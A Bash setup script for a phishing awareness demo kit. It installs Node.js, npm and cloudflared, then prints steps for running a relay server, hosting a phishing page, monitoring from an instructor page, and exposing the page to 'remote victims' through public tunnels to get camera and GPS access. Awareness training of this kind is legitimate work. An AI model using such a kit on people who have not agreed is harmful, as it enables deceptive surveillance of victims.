#!/usr/bin/env bash
# setup.sh — CSA Phishing Awareness Demo · One-shot Linux Setup
# ─────────────────────────────────────────────────────────────
# Usage:
#   chmod +x setup.sh
#   ./setup.sh
#
# What it does:
#   1. Checks that Node.js v16+ is installed
#   2. Runs npm install (ws + better-sqlite3)
#   3. Prints next-step instructions

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Colour

echo ""
echo "╔══════════════════════════════════════════════════════════╗"
echo "║  CSA Phishing Awareness Demo — Linux Setup               ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo ""

# ── 1. Check & Install Node.js / NPM ──────────────────────────
if ! command -v node &>/dev/null || ! command -v npm &>/dev/null; then
  echo -e "${YELLOW}➜ Node.js or npm not found. Installing via apt...${NC}"
  sudo apt-get update -y
  sudo apt-get install -y nodejs npm
else
  NODE_VERSION=$(node -e "process.stdout.write(process.versions.node)")
  echo -e "${GREEN}✓ Node.js v${NODE_VERSION} already installed.${NC}"
fi

# ── 2. Check & Install Cloudflared ────────────────────────────
if ! command -v cloudflared &>/dev/null; then
  echo -e "${YELLOW}➜ cloudflared not found. Downloading and installing...${NC}"
  curl -L -o /tmp/cloudflared.deb https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
  sudo dpkg -i /tmp/cloudflared.deb
  rm /tmp/cloudflared.deb
else
  echo -e "${GREEN}✓ cloudflared already installed.${NC}"
fi

# ── 3. npm install (Kit Dependencies) ─────────────────────────
echo ""
echo -e "${YELLOW}➜ Installing kit dependencies (ws, better-sqlite3)...${NC}"
npm install
echo -e "${GREEN}✓ Dependencies installed.${NC}"

# ── 4. Next Steps ─────────────────────────────────────────────
echo ""
echo "╔══════════════════════════════════════════════════════════╗"
echo "║  Setup complete — follow these steps to run the demo:    ║"
echo "╠══════════════════════════════════════════════════════════╣"
echo "║                                                          ║"
echo "║  1. Edit relay.js → change INSTRUCTOR_TOKENS             ║"
echo "║     (each token should be secret per instructor)         ║"
echo "║                                                          ║"
echo "║  2. Start the relay server:                              ║"
echo "║     node relay.js                                        ║"
echo "║                                                          ║"
echo "║  3. Host the phishing page locally:                      ║"
echo "║     python3 -m http.server 8080                          ║"
echo "║                                                          ║"
echo "║  4. Open instructor.html in your browser to monitor      ║"
echo "║                                                          ║"
echo "║  5. For remote victims (requires HTTPS for Camera/GPS):  ║"
echo "║     Terminal A: cloudflared tunnel --url http://127.0.0.1:8080 ║"
echo "║     Terminal B: cloudflared tunnel --url http://127.0.0.1:8765 ║"
echo "║     (Then update WS_URL in instructor.html & phish.html) ║"
echo "║                                                          ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo ""
